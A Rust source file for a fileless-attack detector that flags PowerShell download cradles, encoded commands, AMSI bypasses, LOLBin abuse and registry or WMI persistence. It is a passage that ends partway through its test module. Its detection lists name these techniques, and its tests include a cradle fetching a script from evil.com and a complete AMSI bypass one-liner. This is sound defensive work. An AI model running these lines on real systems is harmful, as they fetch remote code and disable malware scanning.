pub mod prelude;

use chrono::{DateTime, Utc};
use regex::Regex;
use royalsecurity_common::types::*;
use sha2::{Digest, Sha256};
use std::collections::HashMap;
use uuid::Uuid;

#[derive(Debug, Clone)]
pub struct FilelessDetector {
    script_blocks: HashMap<u32, Vec<ScriptBlock>>,
    amsi_events: Vec<AmsiEvent>,
    detections: Vec<FilelessDetection>,
    config: FilelessConfig,
    detection_count: u64,
}

#[derive(Debug, Clone)]
pub struct FilelessConfig {
    pub detect_powershell_attacks: bool,
    pub detect_script_obfuscation: bool,
    pub detect_amsi_bypass: bool,
    pub detect_registry_payloads: bool,
    pub detect_wmi_execution: bool,
    pub max_script_block_length: usize,
    pub obfuscation_threshold: f64,
}

impl Default for FilelessConfig {
    fn default() -> Self {
        Self {
            detect_powershell_attacks: true,
            detect_script_obfuscation: true,
            detect_amsi_bypass: true,
            detect_registry_payloads: true,
            detect_wmi_execution: true,
            max_script_block_length: 10000,
            obfuscation_threshold: 0.7,
        }
    }
}

#[derive(Debug, Clone)]
pub struct ScriptBlock {
    pub text: String,
    pub timestamp: DateTime<Utc>,
    pub process_id: u32,
    pub hash: String,
}

impl ScriptBlock {
    pub fn new(text: String, process_id: u32) -> Self {
        let mut hasher = Sha256::new();
        hasher.update(text.as_bytes());
        let hash = format!("{:x}", hasher.finalize());
        Self {
            text,
            timestamp: Utc::now(),
            process_id,
            hash,
        }
    }
}

#[derive(Debug, Clone)]
pub struct AmsiEvent {
    pub process_id: u32,
    pub scan_result: AmsiScanResult,
    pub content_hash: String,
    pub app_name: String,
    pub content_name: String,
    pub timestamp: DateTime<Utc>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum AmsiScanResult {
    Clean,
    Detected,
    Blocked,
    Error,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum FilelessAttackType {
    PowerShellObfuscation,
    AmsiBypass,
    ReflectiveLoading,
    RegistryPayload,
    WmiExecution,
    ScriptBlockEncoding,
    CertutilDownload,
    MshtaExecution,
    Regsvr32Abuse,
    Rundll32Abuse,
}

#[derive(Debug, Clone)]
pub struct FilelessDetection {
    pub id: Uuid,
    pub attack_type: FilelessAttackType,
    pub severity: EventSeverity,
    pub process_pid: u32,
    pub process_name: String,
    pub confidence: f32,
    pub description: String,
    pub evidence: Vec<String>,
    pub timestamp: DateTime<Utc>,
}

#[derive(Debug, Clone)]
pub struct ObfuscationIndicator {
    pub technique: String,
    pub description: String,
    pub weight: f32,
}

impl FilelessDetector {
    pub fn new() -> Self {
        tracing::info!("Initializing FilelessDetector with default config");
        Self {
            script_blocks: HashMap::new(),
            amsi_events: Vec::new(),
            detections: Vec::new(),
            config: FilelessConfig::default(),
            detection_count: 0,
        }
    }

    pub fn with_config(config: FilelessConfig) -> Self {
        tracing::info!("Initializing FilelessDetector with custom config");
        Self {
            script_blocks: HashMap::new(),
            amsi_events: Vec::new(),
            detections: Vec::new(),
            config,
            detection_count: 0,
        }
    }

    pub fn analyze_script_block(
        &mut self,
        process_id: u32,
        process_name: &str,
        script_text: &str,
    ) -> Vec<FilelessDetection> {
        if script_text.len() > self.config.max_script_block_length {
            tracing::warn!(
                process_id,
                process_name,
                length = script_text.len(),
                "Script block exceeds max length, truncating analysis"
            );
        }

        let block = ScriptBlock::new(script_text.to_string(), process_id);
        self.script_blocks
            .entry(process_id)
            .or_default()
            .push(block);

        let lower = script_text.to_lowercase();
        let mut detections = Vec::new();

        if self.config.detect_amsi_bypass {
            let amsi_patterns = [
                (
                    "[ref].assembly.gettype",
                    "AMSI type reflection bypass detected",
                ),
                (
                    "amsiutils",
                    "AmsiUtils tampering attempt detected",
                ),
                (
                    "amsiinitfailed",
                    "AMSI init failure bypass detected",
                ),
                (
                    "amsiscanbuffer",
                    "AMSI scan buffer manipulation detected",
                ),
                (
                    "amsicontext",
                    "AMSI context manipulation detected",
                ),
            ];

            for (pattern, desc) in &amsi_patterns {
                if lower.contains(pattern) {
                    tracing::warn!(
                        process_id,
                        process_name,
                        pattern,
                        "AMSI bypass pattern detected"
                    );
                    detections.push(FilelessDetection {
                        id: Uuid::new_v4(),
                        attack_type: FilelessAttackType::AmsiBypass,
                        severity: EventSeverity::Critical,
                        process_pid: process_id,
                        process_name: process_name.to_string(),
                        confidence: 0.95,
                        description: desc.to_string(),
                        evidence: vec![extract_evidence(script_text, pattern)],
                        timestamp: Utc::now(),
                    });
                }
            }
        }

        if self.config.detect_powershell_attacks {
            let iex_patterns = [
                "invoke-expression",
                "iex ",
                "iex(",
                "iex (",
                "invoke-expression ",
                "[scriptblock]::create(",
            ];

            for pattern in &iex_patterns {
                if lower.contains(pattern) {
                    tracing::warn!(
                        process_id,
                        process_name,
                        pattern,
                        "Invoke-Expression variant detected"
                    );
                    detections.push(FilelessDetection {
                        id: Uuid::new_v4(),
                        attack_type: FilelessAttackType::PowerShellObfuscation,
                        severity: EventSeverity::High,
                        process_pid: process_id,
                        process_name: process_name.to_string(),
                        confidence: 0.90,
                        description: format!("Dynamic code execution via {}", pattern.trim()),
                        evidence: vec![extract_evidence(script_text, pattern)],
                        timestamp: Utc::now(),
                    });
                    break;
                }
            }

            let download_patterns = [
                "net.webclient",
                "invoke-webrequest",
                "invoke-restmethod",
                "invoke-expression (new-object",
                "downloadstring(",
                "downloadfile(",
                "downloaddata(",
                "start-bitstransfer",
                "bitsadmin",
            ];

            for pattern in &download_patterns {
                if lower.contains(pattern) {
                    tracing::warn!(
                        process_id,
                        process_name,
                        pattern,
                        "Download cradle detected"
                    );
                    detections.push(FilelessDetection {
                        id: Uuid::new_v4(),
                        attack_type: FilelessAttackType::PowerShellObfuscation,
                        severity: EventSeverity::High,
                        process_pid: process_id,
                        process_name: process_name.to_string(),
                        confidence: 0.88,
                        description: format!("Download cradle pattern: {}", pattern),
                        evidence: vec![extract_evidence(script_text, pattern)],
                        timestamp: Utc::now(),
                    });
                    break;
                }
            }

            let encoded_patterns = [
                " -enc ",
                "-encodedcommand ",
                "-enc ",
                " -e ",
                "frombase64string",
                "[convert]::tobytes(",
                "system.text.encoding]::unicode",
                "system.text.encoding]::ascii",
            ];

            for pattern in &encoded_patterns {
                if lower.contains(pattern) {
                    tracing::warn!(
                        process_id,
                        process_name,
                        pattern,
                        "Encoded command detected"
                    );
                    detections.push(FilelessDetection {
                        id: Uuid::new_v4(),
                        attack_type: FilelessAttackType::ScriptBlockEncoding,
                        severity: EventSeverity::High,
                        process_pid: process_id,
                        process_name: process_name.to_string(),
                        confidence: 0.85,
                        description: format!("Encoded/obfuscated command: {}", pattern.trim()),
                        evidence: vec![extract_evidence(script_text, pattern)],
                        timestamp: Utc::now(),
                    });
                    break;
                }
            }
        }

        if self.config.detect_wmi_execution {
            let wmi_patterns = [
                "get-wmiobject",
                "get-ciminstance",
                "invoke-wmimethod",
                "win32_process",
                "win32_processstarttrace",
                ".create(",
                "wmic ",
                "set-wmiinstance",
            ];

            for pattern in &wmi_patterns {
                if lower.contains(pattern) {
                    tracing::warn!(
                        process_id,
                        process_name,
                        pattern,
                        "WMI execution pattern detected"
                    );
                    detections.push(FilelessDetection {
                        id: Uuid::new_v4(),
                        attack_type: FilelessAttackType::WmiExecution,
                        severity: EventSeverity::High,
                        process_pid: process_id,
                        process_name: process_name.to_string(),
                        confidence: 0.82,
                        description: format!("WMI-based execution: {}", pattern),
                        evidence: vec![extract_evidence(script_text, pattern)],
                        timestamp: Utc::now(),
                    });
                    break;
                }
            }
        }

        let certutil_patterns = ["certutil -urlcache", "certutil -decode", "certutil -encode"];
        for pattern in &certutil_patterns {
            if lower.contains(pattern) {
                tracing::warn!(
                    process_id,
                    process_name,
                    pattern,
                    "Certutil abuse detected"
                );
                detections.push(FilelessDetection {
                    id: Uuid::new_v4(),
                    attack_type: FilelessAttackType::CertutilDownload,
                    severity: EventSeverity::Medium,
                    process_pid: process_id,
                    process_name: process_name.to_string(),
                    confidence: 0.80,
                    description: format!("Certutil LOLBin abuse: {}", pattern),
                    evidence: vec![extract_evidence(script_text, pattern)],
                    timestamp: Utc::now(),
                });
                break;
            }
        }

        if lower.contains("mshta vbscript:") || lower.contains("mshta \"vbscript:") {
            tracing::warn!(process_id, process_name, "Mshta execution detected");
            detections.push(FilelessDetection {
                id: Uuid::new_v4(),
                attack_type: FilelessAttackType::MshtaExecution,
                severity: EventSeverity::High,
                process_pid: process_id,
                process_name: process_name.to_string(),
                confidence: 0.87,
                description: "Mshta VBS script execution".to_string(),
                evidence: vec![extract_evidence(script_text, "mshta")],
                timestamp: Utc::now(),
            });
        }

        if lower.contains("regsvr32 /s /n /u /i:")
            || lower.contains("regsvr32 /s /n /u /i:")
        {
            tracing::warn!(process_id, process_name, "Regsvr32 abuse detected");
            detections.push(FilelessDetection {
                id: Uuid::new_v4(),
                attack_type: FilelessAttackType::Regsvr32Abuse,
                severity: EventSeverity::High,
                process_pid: process_id,
                process_name: process_name.to_string(),
                confidence: 0.85,
                description: "Regsvr32 scrobj.dll abuse (SCT payload)".to_string(),
                evidence: vec![extract_evidence(script_text, "regsvr32")],
                timestamp: Utc::now(),
            });
        }

        if lower.contains("rundll32.exe")
            && (lower.contains("javascript:")
                || lower.contains("vbscript:")
                || lower.contains("url.dll")
                || lower.contains("ieframe.dll"))
        {
            tracing::warn!(process_id, process_name, "Rundll32 abuse detected");
            detections.push(FilelessDetection {
                id: Uuid::new_v4(),
                attack_type: FilelessAttackType::Rundll32Abuse,
                severity: EventSeverity::High,
                process_pid: process_id,
                process_name: process_name.to_string(),
                confidence: 0.83,
                description: "Rundll32 script execution abuse".to_string(),
                evidence: vec![extract_evidence(script_text, "rundll32")],
                timestamp: Utc::now(),
            });
        }

        if self.config.detect_script_obfuscation {
            let score = self.calculate_obfuscation_score(script_text);
            if score >= self.config.obfuscation_threshold {
                let mut indicators = Vec::new();

                let special_ratio = calculate_special_char_ratio(script_text);
                if special_ratio > 0.3 {
                    indicators.push(ObfuscationIndicator {
                        technique: "High special character ratio".to_string(),
                        description: format!("Special char ratio: {:.2}", special_ratio),
                        weight: 0.3,
                    });
                }

                let nonprint_ratio = calculate_nonprintable_ratio(script_text);
                if nonprint_ratio > 0.1 {
                    indicators.push(ObfuscationIndicator {
                        technique: "Non-printable characters".to_string(),
                        description: format!("Non-printable ratio: {:.2}", nonprint_ratio),
                        weight: 0.3,
                    });
                }

                let concat_patterns = ["-join", "[char]", "$env:"];
                for pat in &concat_patterns {
                    if lower.contains(pat) {
                        indicators.push(ObfuscationIndicator {
                            technique: "String concatenation".to_string(),
                            description: format!("Pattern: {}", pat),
                            weight: 0.2,
                        });
                    }
                }

                let hex_pattern = Regex::new(r"\\x[0-9a-f]{2}").unwrap();
                if hex_pattern.is_match(script_text) {
                    indicators.push(ObfuscationIndicator {
                        technique: "Hex encoding".to_string(),
                        description: "Hex-encoded characters found".to_string(),
                        weight: 0.25,
                    });
                }

                let evidence: Vec<String> = indicators
                    .iter()
                    .map(|i| format!("{}: {}", i.technique, i.description))
                    .collect();

                tracing::warn!(
                    process_id,
                    process_name,
                    score,
                    indicator_count = indicators.len(),
                    "High obfuscation score detected"
                );

                detections.push(FilelessDetection {
                    id: Uuid::new_v4(),
                    attack_type: FilelessAttackType::PowerShellObfuscation,
                    severity: if score > 0.85 {
                        EventSeverity::Critical
                    } else {
                        EventSeverity::High
                    },
                    process_pid: process_id,
                    process_name: process_name.to_string(),
                    confidence: score as f32,
                    description: format!("Script obfuscation detected (score: {:.2})", score),
                    evidence,
                    timestamp: Utc::now(),
                });
            }
        }

        self.detection_count += detections.len() as u64;
        self.detections.extend(detections.clone());
        detections
    }

    pub fn analyze_process_event(&mut self, info: &ProcessInfo) -> Vec<FilelessDetection> {
        let mut detections = Vec::new();
        let name_lower = info.name.to_lowercase();
        let cmd_lower = info.command_line.to_lowercase();

        if (name_lower.contains("powershell") || name_lower.contains("pwsh"))
            && (cmd_lower.contains("-enc ")
                || cmd_lower.contains("-encodedcommand ")
                || cmd_lower.contains("invoke-expression")
                || cmd_lower.contains("iex ")
                || cmd_lower.contains("frombase64string"))
        {
            tracing::warn!(
                pid = info.pid,
                name = %info.name,
                command_line = %info.command_line.chars().take(200).collect::<String>(),
                "Encoded/obfuscated PowerShell execution detected"
            );
            detections.push(FilelessDetection {
                id: Uuid::new_v4(),
                attack_type: FilelessAttackType::ScriptBlockEncoding,
                severity: EventSeverity::High,
                process_pid: info.pid,
                process_name: info.name.clone(),
                confidence: 0.88,
                description: "Encoded PowerShell command execution".to_string(),
                evidence: vec![format!(
                    "CommandLine: {}",
                    info.command_line.chars().take(500).collect::<String>()
                )],
                timestamp: Utc::now(),
            });
        }

        if (name_lower.contains("powershell") || name_lower.contains("pwsh"))
            && info.ppid > 0
        {
            tracing::debug!(
                pid = info.pid,
                ppid = info.ppid,
                name = %info.name,
                "PowerShell spawned, checking parent context"
            );
            detections.push(FilelessDetection {
                id: Uuid::new_v4(),
                attack_type: FilelessAttackType::PowerShellObfuscation,
                severity: EventSeverity::Medium,
                process_pid: info.pid,
                process_name: info.name.clone(),
                confidence: 0.50,
                description: "PowerShell process created - parent context needed".to_string(),
                evidence: vec![
                    format!("PID: {}", info.pid),
                    format!("PPID: {}", info.ppid),
                    format!("User: {}", info.user),
                ],
                timestamp: Utc::now(),
            });
        }

        let lolbin_names = [
            "mshta.exe",
            "wscript.exe",
            "cscript.exe",
            "regsvr32.exe",
            "rundll32.exe",
        ];

        for lolbin in &lolbin_names {
            if name_lower == *lolbin {
                let attack_type = match *lolbin {
                    "mshta.exe" => FilelessAttackType::MshtaExecution,
                    "regsvr32.exe" => FilelessAttackType::Regsvr32Abuse,
                    "rundll32.exe" => FilelessAttackType::Rundll32Abuse,
                    _ => FilelessAttackType::WmiExecution,
                };

                let severity = if cmd_lower.contains("http")
                    || cmd_lower.contains("script")
                    || cmd_lower.contains("javascript:")
                    || cmd_lower.contains("vbscript:")
                {
                    EventSeverity::High
                } else {
                    EventSeverity::Medium
                };

                tracing::warn!(
                    pid = info.pid,
                    name = %info.name,
                    command_line = %info.command_line.chars().take(200).collect::<String>(),
                    "LOLBin execution detected"
                );

                detections.push(FilelessDetection {
                    id: Uuid::new_v4(),
                    attack_type,
                    severity,
                    process_pid: info.pid,
                    process_name: info.name.clone(),
                    confidence: 0.75,
                    description: format!("{} execution with suspicious arguments", lolbin),
                    evidence: vec![format!(
                        "CommandLine: {}",
                        info.command_line.chars().take(500).collect::<String>()
                    )],
                    timestamp: Utc::now(),
                });
            }
        }

        if cmd_lower.contains("get-wmiobject")
            || cmd_lower.contains("invoke-wmimethod")
            || cmd_lower.contains("win32_process")
            || cmd_lower.contains("wmic")
        {
            tracing::warn!(
                pid = info.pid,
                name = %info.name,
                "WMI execution via process detected"
            );
            detections.push(FilelessDetection {
                id: Uuid::new_v4(),
                attack_type: FilelessAttackType::WmiExecution,
                severity: EventSeverity::High,
                process_pid: info.pid,
                process_name: info.name.clone(),
                confidence: 0.82,
                description: "WMI-based process creation".to_string(),
                evidence: vec![format!(
                    "CommandLine: {}",
                    info.command_line.chars().take(500).collect::<String>()
                )],
                timestamp: Utc::now(),
            });
        }

        self.detection_count += detections.len() as u64;
        self.detections.extend(detections.clone());
        detections
    }

    pub fn analyze_registry_event(&mut self, event: &RegistryEvent) -> Vec<FilelessDetection> {
        let mut detections = Vec::new();
        let key_lower = event.key_path.to_lowercase();
        let value_data_lower = event
            .value_data
            .as_deref()
            .unwrap_or("")
            .to_lowercase();

        let suspicious_run_keys = [
            "\\microsoft\\windows\\currentversion\\run",
            "\\microsoft\\windows\\currentversion\\runonce",
            "\\microsoft\\windows\\currentversion\\runonceex",
            "\\microsoft\\windows\\currentversion\\explorer\\shell folders",
            "\\microsoft\\windows\\currentversion\\explorer\\user shell folders",
        ];

        let is_run_key = suspicious_run_keys.iter().any(|k| key_lower.contains(k));

        if is_run_key && event.value_data.is_some() {
            let payload_indicators = [
                "powershell",
                "pwsh",
                "cmd.exe",
                "wscript",
                "cscript",
                "mshta",
                "rundll32",
                "regsvr32",
                "certutil",
                "bitsadmin",
                "-enc ",
                "-encodedcommand",
                "invoke-expression",
                "iex ",
                "frombase64string",
                "downloadstring",
                "downloadfile",
                "new-object net.webclient",
                "javascript:",
                "vbscript:",
            ];

            for indicator in &payload_indicators {
                if value_data_lower.contains(indicator) {
                    tracing::warn!(
                        key = %event.key_path,
                        value = %event.value_name.as_deref().unwrap_or(""),
                        data = %event.value_data.as_deref().unwrap_or(""),
                        indicator,
                        "Suspicious Run key payload detected"
                    );

                    detections.push(FilelessDetection {
                        id: Uuid::new_v4(),
                        attack_type: FilelessAttackType::RegistryPayload,
                        severity: EventSeverity::Critical,
                        process_pid: 0,
                        process_name: "Registry".to_string(),
                        confidence: 0.92,
                        description: format!(
                            "Fileless payload in Run key via {}",
                            indicator
                        ),
                        evidence: vec![
                            format!("Key: {}", event.key_path),
                            format!(
                                "Value: {}",
                                event.value_name.as_deref().unwrap_or("")
                            ),
                            format!(
                                "Data: {}",
                                event.value_data.as_deref().unwrap_or("")
                            ),
                        ],
                        timestamp: Utc::now(),
                    });
                    break;
                }
            }
        }

        if key_lower.contains("image file execution options") && key_lower.contains("\\debugger") {
            if let Some(ref data) = event.value_data {
                let data_lower = data.to_lowercase();
                if data_lower.contains("powershell")
                    || data_lower.contains("cmd.exe")
                    || data_lower.contains("wscript")
                    || data_lower.contains("cscript")
                    || data_lower.contains("mshta")
                {
                    tracing::warn!(
                        key = %event.key_path,
                        data = %data,
                        "IFEO debugger hijack detected"
                    );
                    detections.push(FilelessDetection {
                        id: Uuid::new_v4(),
                        attack_type: FilelessAttackType::RegistryPayload,
                        severity: EventSeverity::Critical,
                        process_pid: 0,
                        process_name: "Registry".to_string(),
                        confidence: 0.93,
                        description: "IFEO debugger hijack with script interpreter".to_string(),
                        evidence: vec![
                            format!("Key: {}", event.key_path),
                            format!("Debugger: {}", data),
                        ],
                        timestamp: Utc::now(),
                    });
                }
            }
        }

        if key_lower.contains("clsid")
            && (key_lower.contains("inprocserver32") || key_lower.contains("localserver32"))
        {
            if let Some(ref data) = event.value_data {
                let data_lower = data.to_lowercase();
                if data_lower.contains("powershell")
                    || data_lower.contains("mshta")
                    || data_lower.contains("wscript")
                    || data_lower.contains("script")
                {
                    tracing::warn!(
                        key = %event.key_path,
                        data = %data,
                        "COM object hijack detected"
                    );
                    detections.push(FilelessDetection {
                        id: Uuid::new_v4(),
                        attack_type: FilelessAttackType::RegistryPayload,
                        severity: EventSeverity::High,
                        process_pid: 0,
                        process_name: "Registry".to_string(),
                        confidence: 0.85,
                        description: "COM object hijack with script interpreter".to_string(),
                        evidence: vec![
                            format!("Key: {}", event.key_path),
                            format!("Server: {}", data),
                        ],
                        timestamp: Utc::now(),
                    });
                }
            }
        }

        let wmi_sub_keys = [
            "\\subscription\\",
            "\\eventfilter\\",
            "\\eventconsumer\\",
            "\\filtertoconsumerbinding\\",
        ];

        for wmi_key in &wmi_sub_keys {
            if key_lower.contains(wmi_key) {
                if let Some(ref data) = event.value_data {
                    let data_lower = data.to_lowercase();
                    if data_lower.contains("powershell")
                        || data_lower.contains("cmd.exe")
                        || data_lower.contains("script")
                        || data_lower.contains("mshta")
                    {
                        tracing::warn!(
                            key = %event.key_path,
                            data = %data,
                            "WMI subscription persistence detected"
                        );
                        detections.push(FilelessDetection {
                            id: Uuid::new_v4(),
                            attack_type: FilelessAttackType::WmiExecution,
                            severity: EventSeverity::Critical,
                            process_pid: 0,
                            process_name: "Registry".to_string(),
                            confidence: 0.90,
                            description: "WMI subscription persistence with script payload"
                                .to_string(),
                            evidence: vec![
                                format!("Key: {}", event.key_path),
                                format!("Data: {}", data),
                            ],
                            timestamp: Utc::now(),
                        });
                        break;
                    }
                }
            }
        }

        self.detection_count += detections.len() as u64;
        self.detections.extend(detections.clone());
        detections
    }

    pub fn analyze_amsi_event(&mut self, event: AmsiEvent) -> Option<FilelessDetection> {
        self.amsi_events.push(event.clone());

        match event.scan_result {
            AmsiScanResult::Detected | AmsiScanResult::Blocked => {
                let severity = match event.scan_result {
                    AmsiScanResult::Blocked => EventSeverity::Critical,
                    _ => EventSeverity::High,
                };

                tracing::warn!(
                    process_id = event.process_id,
                    app = %event.app_name,
                    content = %event.content_name,
                    result = ?event.scan_result,
                    "AMSI threat detection event"
                );

                let detection = FilelessDetection {
                    id: Uuid::new_v4(),
                    attack_type: FilelessAttackType::AmsiBypass,
                    severity,
                    process_pid: event.process_id,
                    process_name: event.app_name.clone(),
                    confidence: 0.95,
                    description: format!(
                        "AMSI {} threat in {} (content: {})",
                        match event.scan_result {
                            AmsiScanResult::Detected => "detected",
                            AmsiScanResult::Blocked => "blocked",
                            _ => "",
                        },
                        event.app_name,
                        event.content_name,
                    ),
                    evidence: vec![
                        format!("App: {}", event.app_name),
                        format!("Content: {}", event.content_name),
                        format!("ContentHash: {}", event.content_hash),
                        format!("Result: {:?}", event.scan_result),
                    ],
                    timestamp: event.timestamp,
                };

                self.detection_count += 1;
                self.detections.push(detection.clone());
                Some(detection)
            }
            AmsiScanResult::Clean => {
                tracing::debug!(
                    process_id = event.process_id,
                    "AMSI scan clean"
                );
                None
            }
            AmsiScanResult::Error => {
                tracing::warn!(
                    process_id = event.process_id,
                    "AMSI scan error - possible bypass attempt"
                );
                let detection = FilelessDetection {
                    id: Uuid::new_v4(),
                    attack_type: FilelessAttackType::AmsiBypass,
                    severity: EventSeverity::Medium,
                    process_pid: event.process_id,
                    process_name: event.app_name.clone(),
                    confidence: 0.60,
                    description: "AMSI scan error - possible bypass attempt".to_string(),
                    evidence: vec![
                        format!("App: {}", event.app_name),
                        format!("Result: Error"),
                    ],
                    timestamp: event.timestamp,
                };
                self.detection_count += 1;
                self.detections.push(detection.clone());
                Some(detection)
            }
        }
    }

    pub fn calculate_obfuscation_score(&self, text: &str) -> f64 {
        if text.is_empty() {
            return 0.0;
        }

        let entropy = calculate_shannon_entropy(text);
        let entropy_score = (entropy / 4.5).min(1.0);

        let special_ratio = calculate_special_char_ratio(text);
        let special_score = (special_ratio * 2.0).min(1.0);

        let nonprint_ratio = calculate_nonprintable_ratio(text);
        let nonprint_score = (nonprint_ratio * 3.0).min(1.0);

        let base64_score = detect_base64_density(text);

        let mut pattern_score: f64 = 0.0;
        let lower = text.to_lowercase();

        if lower.contains("-join") || lower.contains("[char]") {
            pattern_score += 0.2;
        }
        if lower.contains("$env:") {
            pattern_score += 0.1;
        }

        let hex_pattern = Regex::new(r"\\x[0-9a-f]{2}").unwrap();
        let hex_count = hex_pattern.find_iter(text).count();
        if hex_count > 3 {
            pattern_score += 0.3;
        }

        let xor_pattern = Regex::new(r"(?i)xor\s+0x[0-9a-f]+").unwrap();
        if xor_pattern.is_match(text) {
            pattern_score += 0.25;
        }

        let repeated = detect_repeated_sequences(text);
        pattern_score += repeated;

        let score = (entropy_score * 0.30
            + special_score * 0.15
            + nonprint_score * 0.15
            + base64_score * 0.25
            + pattern_score.min(1.0) * 0.15)
            .min(1.0);

        tracing::debug!(
            entropy_score,
            special_score,
            nonprint_score,
            base64_score,
            pattern_score,
            final_score = score,
            "Obfuscation score calculated"
        );

        score
    }

    pub fn detection_count(&self) -> u64 {
        self.detection_count
    }

    pub fn clear(&mut self) {
        tracing::info!(
            detections_cleared = self.detections.len(),
            "Clearing fileless detector state"
        );
        self.script_blocks.clear();
        self.amsi_events.clear();
        self.detections.clear();
        self.detection_count = 0;
    }
}

fn extract_evidence(text: &str, pattern: &str) -> String {
    let lower = text.to_lowercase();
    let pat_lower = pattern.to_lowercase();
    if let Some(pos) = lower.find(&pat_lower) {
        let start = pos.saturating_sub(40);
        let end = (pos + pattern.len() + 60).min(text.len());
        let context = &text[start..end];
        let prefix = if start > 0 { "..." } else { "" };
        let suffix = if end < text.len() { "..." } else { "" };
        format!("{}{}{}", prefix, context, suffix)
    } else {
        text.chars().take(200).collect::<String>()
    }
}

fn calculate_shannon_entropy(text: &str) -> f64 {
    if text.is_empty() {
        return 0.0;
    }

    let mut freq = HashMap::new();
    for ch in text.chars() {
        *freq.entry(ch).or_insert(0u64) += 1;
    }

    let len = text.len() as f64;
    let mut entropy = 0.0;

    for &count in freq.values() {
        let p = count as f64 / len;
        if p > 0.0 {
            entropy -= p * p.log2();
        }
    }

    entropy
}

fn calculate_special_char_ratio(text: &str) -> f64 {
    if text.is_empty() {
        return 0.0;
    }
    let special_count = text
        .chars()
        .filter(|c| !c.is_alphanumeric() && !c.is_whitespace())
        .count();
    special_count as f64 / text.len() as f64
}

fn calculate_nonprintable_ratio(text: &str) -> f64 {
    if text.is_empty() {
        return 0.0;
    }
    let nonprint_count = text.chars().filter(|c| c.is_control() && *c != '\n' && *c != '\r' && *c != '\t').count();
    nonprint_count as f64 / text.len() as f64
}

fn detect_base64_density(text: &str) -> f64 {
    let trimmed = text.trim();
    if trimmed.len() < 16 {
        return 0.0;
    }

    let base64_chars: f64 = trimmed
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || *c == '+' || *c == '/' || *c == '=')
        .count() as f64;

    let ratio = base64_chars / trimmed.len() as f64;

    if ratio > 0.85 && trimmed.len() > 40 {
        let has_padding = trimmed.ends_with('=') || trimmed.ends_with("==");
        let length_valid = trimmed.len() % 4 == 0 || trimmed.len() % 4 == 2 || trimmed.len() % 4 == 3;

        if has_padding || length_valid {
            (ratio * 1.1).min(1.0)
        } else {
            ratio * 0.7
        }
    } else if ratio > 0.70 {
        ratio * 0.4
    } else {
        0.0
    }
}

fn detect_repeated_sequences(text: &str) -> f64 {
    if text.len() < 20 {
        return 0.0;
    }

    let chunk_size = 8;
    let mut chunks: HashMap<String, usize> = HashMap::new();

    for i in 0..=(text.len().saturating_sub(chunk_size)) {
        let chunk = &text[i..i + chunk_size];
        *chunks.entry(chunk.to_string()).or_insert(0) += 1;
    }

    let repeated_count: usize = chunks.values().filter(|&&c| c > 1).sum();
    let total_chunks = text.len().saturating_sub(chunk_size) + 1;

    if total_chunks == 0 {
        return 0.0;
    }

    (repeated_count as f64 / total_chunks as f64 * 2.0).min(0.4)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_fileless_detector_new() {
        let detector = FilelessDetector::new();
        assert_eq!(detector.detection_count(), 0);
        assert!(detector.script_blocks.is_empty());
        assert!(detector.amsi_events.is_empty());
        assert!(detector.detections.is_empty());
        assert!(detector.config.detect_powershell_attacks);
        assert!(detector.config.detect_script_obfuscation);
        assert!(detector.config.detect_amsi_bypass);
        assert!(detector.config.detect_registry_payloads);
        assert!(detector.config.detect_wmi_execution);
        assert_eq!(detector.config.max_script_block_length, 10000);
        assert!((detector.config.obfuscation_threshold - 0.7).abs() < f64::EPSILON);
    }

    #[test]
    fn test_analyze_script_block_detects_invoke_expression() {
        let mut detector = FilelessDetector::new();
        let detections =
            detector.analyze_script_block(100, "powershell.exe", "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')");

        assert!(!detections.is_empty());
        let attack_types: Vec<_> = detections.iter().map(|d| &d.attack_type).collect();
        assert!(
            attack_types.contains(&&FilelessAttackType::PowerShellObfuscation)
                || attack_types.contains(&&FilelessAttackType::AmsiBypass)
        );

        let iex_detection = detections
            .iter()
            .find(|d| d.description.contains("Invoke-Expression") || d.description.contains("Download cradle"));
        assert!(iex_detection.is_some());
    }

    #[test]
    fn test_analyze_script_block_detects_amsi_bypass() {
        let mut detector = FilelessDetector::new();
        let detections = detector.analyze_script_block(
            200,
            "powershell.exe",
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        );

        assert!(!detections.is_empty());
        let amsi_detection = detections
            .iter()
            .find(|d| d.attack_type == FilelessAttackType::AmsiBypass);
        assert!(amsi_detection.is_some());
        let det = amsi_detection.unwrap();
        assert_eq!(det.severity, EventSeverity::Critical);
        assert!(det.confidence > 0.9);
    }

    #[test]
    fn test_analyze_script_block_detects_base64_encoded_commands() {
        let mut detector = FilelessDetector::new();
        let fake_base64 = "SQBmACgAJABlAG4AdgA6AEMASABBAEkATABJAE4ARwApAC0A";
        let script = format!("-EncodedCommand {}", fake_base64);

        let detections = detector.analyze_script_block(300, "powershell.exe", &script);
        assert!(!detections.is_empty());

        let encoding_detection = detections
            .iter()
            .find(|d| d.attack_type == FilelessAttackType::ScriptBlockEncoding);
        assert!(encoding_detection.is_some());
    }

    #[test]
    fn test_analyze_process_event_detects_powershell_from_office() {
        let mut detector = FilelessDetector::new();
        let info = ProcessInfo {
            pid: 500,
            ppid: 400,
            name: "powershell.exe".to_string(),
            path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe".to_string(),
            command_line: "powershell.exe -enc SQBmACgA".to_string(),
            user: "DOMAIN\\user".to_string(),
            hash_sha256: None,
            integrity_level: Some("High".to_string()),
            timestamp: Utc::now(),
        };

        let detections = detector.analyze_process_event(&info);
        assert!(!detections.is_empty());

        let encoded_detection = detections
            .iter()
            .find(|d| d.attack_type == FilelessAttackType::ScriptBlockEncoding);
        assert!(encoded_detection.is_some());
    }

    #[test]
    fn test_calculate_obfuscation_score_clean_vs_obfuscated() {
        let detector = FilelessDetector::new();

        let clean_text = "Write-Host 'Hello, World! This is a normal script.'";
        let clean_score = detector.calculate_obfuscation_score(clean_text);
        assert!(
            clean_score < 0.5,
            "Clean text score {} should be < 0.5",
            clean_score
        );

